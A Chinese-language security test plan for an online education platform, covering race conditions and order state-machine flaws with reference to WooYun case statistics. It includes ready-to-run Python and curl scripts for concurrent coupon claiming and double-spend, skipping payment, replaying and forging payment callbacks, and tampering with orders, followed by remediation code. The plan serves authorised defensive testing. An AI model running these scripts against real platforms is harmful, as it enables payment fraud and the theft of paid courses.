# 在线教育平台 — 竞态条件与状态机漏洞专项测试方案

> 基于 WooYun 22,132 个真实漏洞案例方法论 | 聚焦逻辑流领域（1,679 案例）与金融领域（2,919 案例）

---

## 一、目标系统业务流程映射

### 1.1 优惠券领取流程

```
状态机：
  [未领取] → 用户点击领取 → [检查是否已领] → [写入领取记录] → [已领取]

关键检查-行动模式（TOCTOU 风险点）：
  检查(user_id, coupon_id) → 无记录 → 插入记录
  ↑ 竞态窗口：检查与插入之间无原子保证
```

### 1.2 课程购买流程

```
预期状态机：
  [浏览] → [加入购物车] → [创建订单/待支付] → [发起支付] → [支付回调/已支付] → [开通课程/已完成]

可能的非法状态转移：
  [待支付] → [已完成]      # 跳过支付直接开通
  [已完成] → [待支付]      # 逆向回退重新利用优惠
  [已支付] → [已退款] → 课程仍可访问   # 退款不回收权限
  [待支付] → 修改订单内容 → [已支付]   # 支付前篡改订单
```

---

## 二、威胁假设（基于 WooYun 模式匹配）

### 假设 H1：优惠券领取存在竞态条件（TOCTOU）

| 维度 | 内容 |
|------|------|
| **WooYun 模式** | 竞态条件/TOCTOU — 266 个案例，74.8% 高危 |
| **攻击原理** | 多个并发请求同时通过"是否已领"检查，均在写入记录前判定为"未领取"，导致同一用户领取多张 |
| **类比案例** | WooYun 优惠券竞速模式：并行应用同一单次使用优惠券（金融领域 1,056 案例中的典型子类） |
| **影响** | 单用户无限领券 → 批量套利 → 平台直接经济损失 |
| **根因** | `SELECT → 判断 → INSERT` 三步非原子，缺乏数据库级唯一约束或分布式锁 |

### 假设 H2：订单状态机可被强制跳转

| 维度 | 内容 |
|------|------|
| **WooYun 模式** | 状态机绕过 — 1,391 个案例，65.3% 高危 |
| **攻击原理** | 直接调用"开通课程"接口或篡改订单状态参数，跳过支付步骤 |
| **类比案例** | 「M1905电影网价值2588套餐只要5毛钱」— 通过后台自批准绕过支付；「114票务网某站逻辑漏洞利用支付超时导致上万用户敏感信息泄漏」— 超时状态机缺陷 |
| **影响** | 免费获取付费课程，平台课程收入归零 |
| **根因** | 服务端未校验状态前置条件，或状态转移逻辑仅在前端控制 |

### 假设 H3：支付回调可重放/伪造

| 维度 | 内容 |
|------|------|
| **WooYun 模式** | 订单篡改 — 1,227 个案例，74.2% 高危 |
| **攻击原理** | 捕获一次成功的支付回调请求，对不同订单重放，或伪造回调签名 |
| **类比案例** | WooYun 金融领域：「重放成功的支付/充值回调」为高频攻击向量 |
| **影响** | 一次真实支付 → 无限开通课程 |

### 假设 H4：订单内容支付后可篡改

| 维度 | 内容 |
|------|------|
| **WooYun 模式** | 业务规则绕过 — 266 个案例 |
| **攻击原理** | 创建低价课程订单 → 支付 → 在回调到达前将订单课程ID替换为高价课程 |
| **类比案例** | 「大特宝官网业务逻辑漏洞可免费甚至低款买保险」— 支付金额与实际商品不匹配 |
| **影响** | 低价购买高价课程 |

### 假设 H5：优惠券可跨订单/堆叠使用

| 维度 | 内容 |
|------|------|
| **WooYun 模式** | 支付篡改/折扣滥用 — 1,056 案例中的子类 |
| **攻击原理** | 同一优惠券应用到多个订单；多张优惠券堆叠使价格降至 0 |
| **影响** | 课程实际支付金额为零或极低 |

---

## 三、测试环境与工具准备

### 3.1 账号准备

| 角色 | 数量 | 用途 |
|------|------|------|
| 普通学生账号 | 3 个 | 并发测试、水平越权测试 |
| 教师/管理员账号 | 1 个 | 垂直权限测试 |
| 新注册账号 | 2 个 | 优惠券首次领取测试 |

### 3.2 工具清单

| 工具 | 用途 |
|------|------|
| Burp Suite + Turbo Intruder | 请求拦截、并发竞态测试 |
| Python `asyncio` + `aiohttp` | 自定义并发测试脚本 |
| mitmproxy | 支付回调拦截与重放 |
| curl | 快速接口验证 |

---

## 四、测试用例详细设计

### 4.1 竞态条件测试 — 优惠券领取（H1）

#### TC-RACE-01：基础并发领券

**目标：** 验证同一用户能否通过并发请求领取多张限领一张的优惠券

**前置条件：**
- 用户 A 未领取目标优惠券
- 优惠券规则为"每人限领一张"

**测试步骤：**

1. 登录用户 A，获取有效 session/token
2. 抓取领取优惠券的 HTTP 请求（含完整 headers、cookies、body）
3. 使用并发脚本同时发送 20 个相同的领取请求
4. 检查响应：统计成功响应数量
5. 检查数据库/接口：用户 A 实际持有的该优惠券数量

**预期结果：** 仅 1 个请求成功，其余 19 个返回"已领取"错误

**漏洞判定：** 2 个或以上请求返回成功，或用户持有 2 张以上该优惠券

**并发测试脚本：**

```python
#!/usr/bin/env python3
"""
优惠券竞态条件测试脚本
WooYun 模式：TOCTOU（266案例，74.8%高危）
"""

import asyncio
import aiohttp
import time
import json
from collections import Counter

# ===== 配置区域 =====
TARGET_URL = "https://edu-platform.example.com/api/coupon/claim"
CONCURRENT_REQUESTS = 20  # 并发数，建议 10-30
COUPON_ID = "COUPON_001"  # 目标优惠券ID

HEADERS = {
    "Content-Type": "application/json",
    "Authorization": "Bearer <USER_A_TOKEN>",  # 替换为实际token
    "Cookie": "<USER_A_COOKIE>",               # 替换为实际cookie
}

PAYLOAD = {
    "coupon_id": COUPON_ID,
}
# ====================


async def claim_coupon(session: aiohttp.ClientSession, req_id: int,
                       barrier: asyncio.Barrier):
    """单个领取请求，使用 barrier 确保所有协程同时发出"""
    await barrier.wait()  # 所有协程在此同步，然后同时放行
    timestamp = time.time()
    try:
        async with session.post(TARGET_URL, json=PAYLOAD,
                                headers=HEADERS, ssl=False) as resp:
            status = resp.status
            body = await resp.text()
            elapsed = time.time() - timestamp
            return {
                "req_id": req_id,
                "status": status,
                "body": body[:500],
                "elapsed_ms": round(elapsed * 1000, 2),
                "timestamp": timestamp,
            }
    except Exception as e:
        return {
            "req_id": req_id,
            "status": -1,
            "body": str(e),
            "elapsed_ms": -1,
            "timestamp": timestamp,
        }


async def main():
    print(f"[*] 优惠券竞态条件测试")
    print(f"[*] 目标: {TARGET_URL}")
    print(f"[*] 并发数: {CONCURRENT_REQUESTS}")
    print(f"[*] 优惠券ID: {COUPON_ID}")
    print("-" * 60)

    barrier = asyncio.Barrier(CONCURRENT_REQUESTS)

    connector = aiohttp.TCPConnector(
        limit=0,              # 不限制连接数
        force_close=True,     # 每次新建连接，避免连接复用导致串行
    )
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            claim_coupon(session, i, barrier)
            for i in range(CONCURRENT_REQUESTS)
        ]
        results = await asyncio.gather(*tasks)

    # ===== 结果分析 =====
    print("\n[*] 请求结果：")
    status_counter = Counter()
    success_count = 0

    for r in sorted(results, key=lambda x: x["timestamp"]):
        is_success = r["status"] == 200 and "success" in r["body"].lower()
        status_counter[r["status"]] += 1
        if is_success:
            success_count += 1
        flag = "<<< SUCCESS" if is_success else ""
        print(f"  [req {r['req_id']:2d}] HTTP {r['status']} | "
              f"{r['elapsed_ms']:7.2f}ms | {flag}")

    print("-" * 60)
    print(f"[*] HTTP 状态码分布: {dict(status_counter)}")
    print(f"[*] 成功领取次数: {success_count}")

    if success_count > 1:
        print(f"\n[!!!] 漏洞确认：存在竞态条件！")
        print(f"      用户成功领取了 {success_count} 张优惠券（限领1张）")
        print(f"      WooYun 模式: TOCTOU 竞态条件")
        print(f"      严重级别: 高危（参考 WooYun 266案例，74.8%高危）")
    elif success_count == 1:
        print(f"\n[OK] 未发现竞态条件，仅 1 次领取成功")
    else:
        print(f"\n[?] 无成功请求，请检查认证信息和接口地址")


if __name__ == "__main__":
    asyncio.run(main())
```

#### TC-RACE-02：多用户并发抢券（库存竞态）

**目标：** 验证限量优惠券（如总共 100 张）能否被超额领取

**步骤：**

1. 准备一个总量为 N 张的限量优惠券
2. 使用 M 个不同用户账号（M > N）同时发送领取请求
3. 检查实际发放数量是否超过 N

```python
#!/usr/bin/env python3
"""
限量优惠券库存竞态测试
验证总量限制是否为原子操作
"""

import asyncio
import aiohttp
import time

TARGET_URL = "https://edu-platform.example.com/api/coupon/claim"
COUPON_ID = "LIMITED_COUPON_001"
COUPON_TOTAL = 10  # 优惠券总量

# 准备多个用户的 token（替换为实际值）
USER_TOKENS = [
    "Bearer token_user_01",
    "Bearer token_user_02",
    # ... 准备 15-20 个用户token（超过优惠券总量）
]


async def claim_as_user(session, user_idx, token, barrier):
    """以特定用户身份领取"""
    headers = {
        "Content-Type": "application/json",
        "Authorization": token,
    }
    payload = {"coupon_id": COUPON_ID}

    await barrier.wait()
    ts = time.time()
    try:
        async with session.post(TARGET_URL, json=payload,
                                headers=headers, ssl=False) as resp:
            return {
                "user": user_idx,
                "status": resp.status,
                "body": (await resp.text())[:300],
                "ts": ts,
            }
    except Exception as e:
        return {"user": user_idx, "status": -1, "body": str(e), "ts": ts}


async def main():
    n_users = len(USER_TOKENS)
    print(f"[*] 库存竞态测试: {n_users} 用户抢 {COUPON_TOTAL} 张券")

    barrier = asyncio.Barrier(n_users)
    connector = aiohttp.TCPConnector(limit=0, force_close=True)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            claim_as_user(session, i, token, barrier)
            for i, token in enumerate(USER_TOKENS)
        ]
        results = await asyncio.gather(*tasks)

    success = [r for r in results if r["status"] == 200
               and "success" in r["body"].lower()]
    print(f"\n[*] 成功领取: {len(success)} / {n_users} 个用户")
    print(f"[*] 优惠券总量: {COUPON_TOTAL}")

    if len(success) > COUPON_TOTAL:
        print(f"\n[!!!] 漏洞确认：库存超卖！")
        print(f"      发放 {len(success)} 张，超过限额 {COUPON_TOTAL} 张")


if __name__ == "__main__":
    asyncio.run(main())
```

#### TC-RACE-03：重复使用优惠券竞态

**目标：** 验证单次使用优惠券能否通过并发请求在多个订单中使用

```python
#!/usr/bin/env python3
"""
优惠券使用竞态测试
WooYun 模式：双花（金融领域高频攻击向量）
"""

import asyncio
import aiohttp

TARGET_URL = "https://edu-platform.example.com/api/order/apply-coupon"
COUPON_CODE = "SINGLE_USE_CODE"

# 预先创建多个待支付订单
ORDER_IDS = ["ORDER_001", "ORDER_002", "ORDER_003", "ORDER_004", "ORDER_005"]

HEADERS = {
    "Content-Type": "application/json",
    "Authorization": "Bearer <USER_TOKEN>",
}


async def apply_coupon(session, order_id, barrier):
    payload = {"order_id": order_id, "coupon_code": COUPON_CODE}
    await barrier.wait()
    async with session.post(TARGET_URL, json=payload,
                            headers=HEADERS, ssl=False) as resp:
        body = await resp.text()
        return {"order_id": order_id, "status": resp.status, "body": body[:300]}


async def main():
    n = len(ORDER_IDS)
    print(f"[*] 优惠券双花测试: 1张券 → {n} 个订单")

    barrier = asyncio.Barrier(n)
    connector = aiohttp.TCPConnector(limit=0, force_close=True)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [apply_coupon(session, oid, barrier) for oid in ORDER_IDS]
        results = await asyncio.gather(*tasks)

    success = [r for r in results if r["status"] == 200
               and "success" in r["body"].lower()]
    print(f"[*] 优惠券成功应用到 {len(success)} 个订单")

    if len(success) > 1:
        print(f"[!!!] 漏洞确认：优惠券双花！单次使用券被用于 {len(success)} 个订单")
        for s in success:
            print(f"      - 订单 {s['order_id']}")


if __name__ == "__main__":
    asyncio.run(main())
```

---

### 4.2 状态机漏洞测试 — 课程购买流程（H2/H3/H4）

#### TC-STATE-01：跳过支付直接开通课程

**WooYun 模式：** 状态机绕过（1,391 案例，65.3% 高危）
**类比案例：** 购物车 → 已完成（完全跳过支付）

**测试步骤：**

1. 正常流程创建订单，记录订单号
2. 不进行支付，直接调用以下接口（逐一尝试）：
   - `POST /api/order/confirm` — 传入订单号
   - `POST /api/order/complete` — 传入订单号
   - `PUT /api/order/{id}/status` — body: `{"status": "paid"}`
   - `POST /api/course/enroll` — 直接传课程ID
3. 检查课程是否已开通

```bash
#!/bin/bash
# 状态机跳步测试 — 跳过支付直接确认订单

BASE_URL="https://edu-platform.example.com/api"
TOKEN="Bearer <USER_TOKEN>"
ORDER_ID="<UNPAID_ORDER_ID>"

echo "[*] TC-STATE-01: 跳过支付直接确认订单"
echo "========================================="

# 尝试1: 直接确认订单
echo -e "\n[1] POST /order/confirm"
curl -s -w "\nHTTP_STATUS: %{http_code}\n" \
  -X POST "$BASE_URL/order/confirm" \
  -H "Authorization: $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"order_id\": \"$ORDER_ID\"}"

# 尝试2: 直接修改订单状态为已支付
echo -e "\n[2] PUT /order/$ORDER_ID/status → paid"
curl -s -w "\nHTTP_STATUS: %{http_code}\n" \
  -X PUT "$BASE_URL/order/$ORDER_ID/status" \
  -H "Authorization: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "paid"}'

# 尝试3: 直接调用课程开通接口
echo -e "\n[3] POST /course/enroll (绕过订单)"
curl -s -w "\nHTTP_STATUS: %{http_code}\n" \
  -X POST "$BASE_URL/course/enroll" \
  -H "Authorization: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"course_id": "<COURSE_ID>"}'

# 验证: 检查课程是否已开通
echo -e "\n[*] 验证课程状态:"
curl -s "$BASE_URL/user/courses" \
  -H "Authorization: $TOKEN" | python3 -m json.tool
```

#### TC-STATE-02：支付回调重放

**WooYun 模式：** 订单篡改（1,227 案例，74.2% 高危）

**测试步骤：**

1. 完成一笔真实的低价课程支付
2. 使用 mitmproxy/Burp 捕获支付网关回调请求
3. 修改回调中的 `order_id` 为另一个未支付订单
4. 重放修改后的回调请求
5. 检查新订单是否变为已支付

```python
#!/usr/bin/env python3
"""
支付回调重放测试
WooYun 模式：订单篡改 — 对不同订单重放成功的支付回调
"""

import requests
import copy
import hashlib

# ===== 配置 =====
CALLBACK_URL = "https://edu-platform.example.com/api/payment/callback"

# 从 Burp/mitmproxy 捕获的真实成功回调（替换为实际值）
ORIGINAL_CALLBACK = {
    "order_id": "PAID_ORDER_001",
    "amount": "99.00",
    "status": "SUCCESS",
    "transaction_id": "TXN_ABC123",
    "sign": "original_signature_here",  # 支付网关签名
    "timestamp": "1709712000",
}

# 要攻击的未支付订单
TARGET_ORDER_IDS = [
    "UNPAID_ORDER_002",
    "UNPAID_ORDER_003",
]
# =================

TOKEN = "Bearer <USER_TOKEN>"


def test_callback_replay():
    print("[*] TC-STATE-02: 支付回调重放测试\n")

    # 测试1：原样重放（检查幂等性）
    print("[1] 原样重放原始回调...")
    resp = requests.post(CALLBACK_URL, json=ORIGINAL_CALLBACK, verify=False)
    print(f"    HTTP {resp.status_code}: {resp.text[:200]}")
    if resp.status_code == 200 and "success" in resp.text.lower():
        print("    [!] 警告: 回调可被重放（缺少幂等校验）")

    # 测试2：修改 order_id 后重放
    for target_oid in TARGET_ORDER_IDS:
        print(f"\n[2] 重放回调，order_id → {target_oid}")
        tampered = copy.deepcopy(ORIGINAL_CALLBACK)
        tampered["order_id"] = target_oid

        resp = requests.post(CALLBACK_URL, json=tampered, verify=False)
        print(f"    HTTP {resp.status_code}: {resp.text[:200]}")

        if resp.status_code == 200 and "success" in resp.text.lower():
            print(f"    [!!!] 漏洞确认: 订单 {target_oid} 被标记为已支付！")
            print(f"         回调签名未校验或未与 order_id 绑定")

    # 测试3：去掉签名字段
    print(f"\n[3] 去掉签名字段后提交...")
    no_sign = copy.deepcopy(ORIGINAL_CALLBACK)
    no_sign.pop("sign", None)
    resp = requests.post(CALLBACK_URL, json=no_sign, verify=False)
    print(f"    HTTP {resp.status_code}: {resp.text[:200]}")
    if resp.status_code == 200:
        print("    [!!!] 漏洞确认: 回调不校验签名！")

    # 测试4：伪造签名
    print(f"\n[4] 伪造签名后提交...")
    fake_sign = copy.deepcopy(ORIGINAL_CALLBACK)
    fake_sign["order_id"] = TARGET_ORDER_IDS[0]
    fake_sign["sign"] = hashlib.md5(b"fake").hexdigest()
    resp = requests.post(CALLBACK_URL, json=fake_sign, verify=False)
    print(f"    HTTP {resp.status_code}: {resp.text[:200]}")
    if resp.status_code == 200:
        print("    [!!!] 漏洞确认: 伪造签名被接受！")


if __name__ == "__main__":
    test_callback_replay()
```

#### TC-STATE-03：订单状态逆向回退

**WooYun 模式：** 状态机绕过 — "能否反向转移？（已支付→待审）"

```bash
#!/bin/bash
# 订单状态逆向回退测试

BASE_URL="https://edu-platform.example.com/api"
TOKEN="Bearer <USER_TOKEN>"

echo "[*] TC-STATE-03: 订单状态逆向回退测试"
echo "========================================="

# 场景A：已完成订单 → 尝试回退到待支付（企图重新使用优惠券）
COMPLETED_ORDER="<COMPLETED_ORDER_ID>"
echo -e "\n[A] 已完成 → 待支付"
for status in "pending" "unpaid" "待支付" "0"; do
  echo "  尝试 status=$status ..."
  curl -s -o /dev/null -w "HTTP %{http_code}" \
    -X PUT "$BASE_URL/order/$COMPLETED_ORDER/status" \
    -H "Authorization: $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"status\": \"$status\"}"
  echo ""
done

# 场景B：已支付订单 → 尝试取消并退款（但保留课程访问）
PAID_ORDER="<PAID_ORDER_ID>"
echo -e "\n[B] 已支付 → 取消+退款"
curl -s -w "\nHTTP %{http_code}\n" \
  -X POST "$BASE_URL/order/$PAID_ORDER/cancel" \
  -H "Authorization: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"reason": "不想学了"}'

# 验证：课程是否仍然可以访问
echo -e "\n[*] 验证课程访问权限是否被回收:"
curl -s "$BASE_URL/course/<COURSE_ID>/access" \
  -H "Authorization: $TOKEN"
```

#### TC-STATE-04：支付前篡改订单内容

**WooYun 模式：** 业务规则绕过

```python
#!/usr/bin/env python3
"""
支付前订单内容篡改测试
流程：创建低价订单 → 修改为高价课程 → 以低价完成支付
"""

import requests
import json

BASE_URL = "https://edu-platform.example.com/api"
TOKEN = "Bearer <USER_TOKEN>"
HEADERS = {
    "Authorization": TOKEN,
    "Content-Type": "application/json",
}

CHEAP_COURSE_ID = "COURSE_FREE_TRIAL"   # 免费/低价课程
EXPENSIVE_COURSE_ID = "COURSE_VIP_9999"  # 高价课程


def test_order_tampering():
    print("[*] TC-STATE-04: 支付前篡改订单内容\n")

    # 步骤1：创建低价课程订单
    print("[1] 创建低价课程订单...")
    resp = requests.post(f"{BASE_URL}/order/create",
                         headers=HEADERS,
                         json={"course_id": CHEAP_COURSE_ID})
    order = resp.json()
    order_id = order.get("order_id") or order.get("id")
    amount = order.get("amount", "?")
    print(f"    订单 {order_id}, 金额: {amount}")

    # 步骤2：尝试修改订单中的课程
    print(f"\n[2] 尝试将课程替换为高价课程 {EXPENSIVE_COURSE_ID}...")

    # 方法A：直接修改订单
    resp_a = requests.put(f"{BASE_URL}/order/{order_id}",
                          headers=HEADERS,
                          json={"course_id": EXPENSIVE_COURSE_ID})
    print(f"    方法A (PUT /order/id): HTTP {resp_a.status_code}")

    # 方法B：通过购物车修改
    resp_b = requests.post(f"{BASE_URL}/cart/update",
                           headers=HEADERS,
                           json={"order_id": order_id,
                                 "items": [{"course_id": EXPENSIVE_COURSE_ID,
                                            "quantity": 1}]})
    print(f"    方法B (购物车更新): HTTP {resp_b.status_code}")

    # 步骤3：检查订单当前状态
    print(f"\n[3] 检查订单当前内容...")
    resp = requests.get(f"{BASE_URL}/order/{order_id}", headers=HEADERS)
    current = resp.json()
    current_course = current.get("course_id", "?")
    current_amount = current.get("amount", "?")
    print(f"    课程: {current_course}, 金额: {current_amount}")

    if str(current_course) == str(EXPENSIVE_COURSE_ID) and \
       float(str(current_amount).replace("¥", "")) <= float(str(amount).replace("¥", "")):
        print(f"\n[!!!] 漏洞确认: 课程已替换为高价课程，但金额未重算！")
        print(f"      原始金额: {amount}, 当前金额: {current_amount}")
        print(f"      WooYun 模式: 订单篡改（1,227案例，74.2%高危）")


if __name__ == "__main__":
    test_order_tampering()
```

---

### 4.3 综合竞态 + 状态机组合攻击

#### TC-COMBO-01：并发支付 + 重复开通

**目标：** 使用竞态条件触发一笔支付对应多次课程开通

```python
#!/usr/bin/env python3
"""
组合攻击：并发触发支付回调 → 多次开通同一课程
WooYun 模式：竞态条件 + 状态机绕过
"""

import asyncio
import aiohttp

CALLBACK_URL = "https://edu-platform.example.com/api/payment/callback"
CONCURRENT = 15

# 真实支付回调数据（从 Burp 捕获）
CALLBACK_DATA = {
    "order_id": "ORDER_001",
    "amount": "99.00",
    "status": "SUCCESS",
    "transaction_id": "TXN_REAL_001",
    "sign": "<REAL_SIGN>",
}


async def fire_callback(session, req_id, barrier):
    await barrier.wait()
    async with session.post(CALLBACK_URL, json=CALLBACK_DATA,
                            ssl=False) as resp:
        return {
            "req_id": req_id,
            "status": resp.status,
            "body": (await resp.text())[:300],
        }


async def main():
    print(f"[*] TC-COMBO-01: 并发支付回调测试 (×{CONCURRENT})")
    barrier = asyncio.Barrier(CONCURRENT)
    connector = aiohttp.TCPConnector(limit=0, force_close=True)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [fire_callback(session, i, barrier) for i in range(CONCURRENT)]
        results = await asyncio.gather(*tasks)

    success = [r for r in results if r["status"] == 200]
    print(f"\n[*] 成功响应: {len(success)} / {CONCURRENT}")

    if len(success) > 1:
        print(f"[!!!] 漏洞确认: 回调被处理 {len(success)} 次！")
        print(f"      可能导致: 重复开通、余额多次入账、积分多次发放")
        print(f"      根因: 回调处理缺少幂等控制（无分布式锁/唯一事务ID）")


if __name__ == "__main__":
    asyncio.run(main())
```

---

## 五、WooYun 案例参考与统计

### 5.1 直接相关案例

| 案例名称 | 漏洞类型 | 严重级别 | 与本测试的关联 |
|----------|---------|---------|---------------|
| M1905电影网价值2588套餐只要5毛钱 | 订单篡改/状态机绕过 | 高危 | 订单自批准绕过支付，与 TC-STATE-01 对应 |
| 114票务网某站逻辑漏洞利用支付超时导致上万用户敏感信息泄漏 | 状态机缺陷 | 高危 | 超时状态下的异常转移，与 TC-STATE-03 对应 |
| 大特宝官网业务逻辑漏洞可免费甚至低款买保险 | 业务规则绕过 | 高危 | 低价购买高价商品，与 TC-STATE-04 对应 |
| 丽子美妆某处严重逻辑漏洞 | 业务规则绕过 | 高危 | 电商逻辑绕过，与优惠券/价格漏洞对应 |
| 超级课程表某主营业务逻辑缺陷导致全体用户真实姓名手机和QQ泄露 | 设计缺陷 | 高危 | 教育平台同类业务，设计层面缺陷 |

### 5.2 统计数据支撑

| 指标 | 数据 | 来源 |
|------|------|------|
| 竞态条件案例总数 | 266 个 | WooYun 逻辑流领域 |
| 竞态条件高危占比 | **74.8%** | WooYun 数据集 |
| 状态机绕过案例总数 | 1,391 个 | WooYun 逻辑流领域 |
| 状态机绕过高危占比 | **65.3%** | WooYun 数据集 |
| 订单篡改案例总数 | 1,227 个 | WooYun 金融领域 |
| 订单篡改高危占比 | **74.2%** | WooYun 数据集 |
| 支付绕过案例总数 | 1,056 个 | WooYun 金融领域 |
| 支付绕过高危占比 | **68.7%** | WooYun 数据集 |
| 逻辑漏洞整体高危率 | **74.8%** | WooYun 逻辑流领域 266 案例 |
| 金融漏洞整体高危率 | **68-83%** | WooYun 金融领域 2,919 案例 |

> **关键洞察：** 竞态条件虽然案例数仅占 266 个（逻辑流领域的 15.8%），但高危率达 74.8%，在所有逻辑漏洞子类中排名第一。这意味着一旦存在竞态条件，几乎必然导致严重后果。

---

## 六、漏洞判定标准与影响评估矩阵

| 测试编号 | 漏洞判定条件 | 严重级别 | 业务影响 |
|---------|-------------|---------|---------|
| TC-RACE-01 | 成功领取 > 1 张 | **高危** | 单用户无限套利，优惠券体系崩溃 |
| TC-RACE-02 | 实际发放 > 限额 | **高危** | 平台超额补贴，直接经济损失 |
| TC-RACE-03 | 优惠券应用于 > 1 个订单 | **高危** | 优惠券双花，订单收入损失 |
| TC-STATE-01 | 未支付订单变为已完成/课程已开通 | **严重** | 免费获取付费课程，核心收入损失 |
| TC-STATE-02 | 篡改后回调被接受 | **严重** | 一次支付无限开通，支付体系被击穿 |
| TC-STATE-03 | 已完成订单可回退 + 课程仍可访问 | **高危** | 退款不回收权限，资金损失 |
| TC-STATE-04 | 课程已替换但金额未变 | **高危** | 低价购买高价课程 |
| TC-COMBO-01 | 回调被多次处理 | **严重** | 余额/积分/课程多次入账 |

---

## 七、修复建议

### 7.1 竞态条件防御（优惠券领取）

```sql
-- 方案1：数据库唯一约束（最简单有效）
ALTER TABLE user_coupons ADD UNIQUE INDEX uk_user_coupon (user_id, coupon_id);

-- 方案2：原子操作（INSERT ... ON DUPLICATE KEY / INSERT IGNORE）
INSERT IGNORE INTO user_coupons (user_id, coupon_id, created_at)
VALUES (#{userId}, #{couponId}, NOW());
-- affected_rows == 1 → 领取成功
-- affected_rows == 0 → 已领取过

-- 方案3：限量券的原子扣减
UPDATE coupons SET remaining = remaining - 1
WHERE coupon_id = #{couponId} AND remaining > 0;
-- affected_rows == 1 → 库存充足，继续发放
```

```python
# 方案4：Redis 分布式锁（高并发场景）
import redis

r = redis.Redis()
lock_key = f"coupon:claim:{user_id}:{coupon_id}"

# SETNX 原子操作
if r.set(lock_key, "1", nx=True, ex=30):  # 30秒过期
    try:
        # 执行领取逻辑
        claim_coupon(user_id, coupon_id)
    finally:
        r.delete(lock_key)
else:
    raise DuplicateClaimError("请勿重复领取")
```

### 7.2 状态机防御（订单流转）

```python
# 服务端有限状态机（白名单转换）
VALID_TRANSITIONS = {
    "created":    ["pending_payment"],
    "pending_payment": ["paid", "cancelled"],
    "paid":       ["enrolled", "refund_pending"],
    "enrolled":   ["completed"],
    "refund_pending": ["refunded"],
    "cancelled":  [],      # 终态，不可再转
    "refunded":   [],      # 终态，不可再转
    "completed":  [],      # 终态，不可再转
}

def transition_order(order, new_status):
    current = order.status
    allowed = VALID_TRANSITIONS.get(current, [])
    if new_status not in allowed:
        raise InvalidTransitionError(
            f"非法状态转移: {current} → {new_status}，"
            f"允许的目标状态: {allowed}"
        )
    # 执行转移...
```

### 7.3 支付回调防御

```python
# 1. 签名验证（必须）
# 2. 幂等性校验（必须）
# 3. 金额匹配验证（必须）

def handle_payment_callback(data):
    # Step 1: 验证签名
    if not verify_gateway_signature(data):
        raise SecurityError("签名校验失败")

    # Step 2: 幂等性 — 检查是否已处理
    if CallbackLog.exists(transaction_id=data["transaction_id"]):
        return {"status": "already_processed"}  # 幂等返回

    # Step 3: 金额匹配
    order = Order.get(data["order_id"])
    if order.amount != Decimal(data["amount"]):
        raise SecurityError("金额不匹配")

    # Step 4: 状态校验
    if order.status != "pending_payment":
        raise SecurityError(f"订单状态异常: {order.status}")

    # Step 5: 在事务中原子更新
    with db.transaction():
        order.update(status="paid")
        CallbackLog.create(transaction_id=data["transaction_id"])
        enroll_user(order.user_id, order.course_id)
```

---

## 八、测试执行检查清单

- [ ] **环境确认：** 在测试/预发布环境执行，禁止直接测试生产环境
- [ ] **数据备份：** 测试前备份相关数据库表
- [ ] **TC-RACE-01：** 单用户并发领券（20并发）
- [ ] **TC-RACE-02：** 多用户抢限量券（用户数 > 券总量）
- [ ] **TC-RACE-03：** 单次使用券并发应用到多订单
- [ ] **TC-STATE-01：** 跳步测试（跳过支付直接开通）
- [ ] **TC-STATE-02：** 支付回调重放与伪造
- [ ] **TC-STATE-03：** 订单状态逆向回退
- [ ] **TC-STATE-04：** 支付前篡改订单内容
- [ ] **TC-COMBO-01：** 并发支付回调
- [ ] **结果记录：** 每个用例的请求/响应截图
- [ ] **数据验证：** 测试后检查数据库中的实际状态（余额、券数、订单状态）
- [ ] **清理：** 测试完毕后回滚测试数据

---

*方法论来源：WooYun 漏洞数据库（2010-2016），22,132 个真实案例 | 逻辑流领域 1,679 案例 | 金融领域 2,919 案例*
